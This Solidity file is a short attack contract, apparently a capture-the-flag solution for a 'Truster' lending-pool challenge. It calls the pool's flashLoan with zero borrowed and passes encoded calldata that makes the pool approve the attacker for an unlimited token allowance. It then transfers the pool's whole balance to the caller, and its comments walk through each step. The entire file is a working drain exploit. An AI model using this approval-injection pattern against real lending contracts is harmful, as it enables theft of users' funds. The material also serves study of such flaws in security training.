// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ITrusterLenderPool {
    function flashLoan(uint256 borrowAmount, address borrower, address target, bytes calldata data) external;
}

contract Attack {


    function attack (address _pool, address _token) public {
    
        ITrusterLenderPool pool = ITrusterLenderPool(_pool);
        IERC20 token = IERC20(_token);


        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max);  

        pool.flashLoan(0, address(this), _token, data);
            // We're not borrowing anything, we'd not be able to pay it back in time.
            // Nothing is being borrowed, so the the receiver doesn't matter much.
            // We make the pool call the token contract.
            // We make the pool give this contract an allowance of maximum uint value possible
                    
        // Now this contract can transfer all of the tokens from the pool to the attacker EOA.
        token.transferFrom(_pool, msg.sender, token.balanceOf(_pool));
    }
}